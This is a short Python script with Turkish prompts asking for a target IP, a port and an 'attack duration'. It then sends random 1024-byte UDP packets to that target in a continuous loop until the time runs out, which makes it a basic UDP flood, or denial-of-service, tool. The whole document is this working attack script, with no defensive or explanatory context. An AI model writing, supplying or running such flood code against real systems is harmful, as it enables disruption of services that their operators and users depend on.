import sys
import os
import socket
import time

def send_udp(ip,port,duration):

    a_bytes = os.urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time()+duration
    packet_number = 0
    while True:
        try:
            if time.time()>timeout:
                print("Sending data "+str(packet_number*1024)+" bytes")
                sys.exit()
            else:
                packet_number += 1
                s.sendto(a_bytes,(ip, port))
                print (packet_number,ip, port)
        except KeyboardInterrupt:
            sys.exit()

if __name__ == "__main__":
    port = int(input("Hedef port : "))
    ip = input("Hedef IP : ")
    duration = int(input("Saldırı süresi :(Saniye) "))
    send_udp(ip,port,duration)           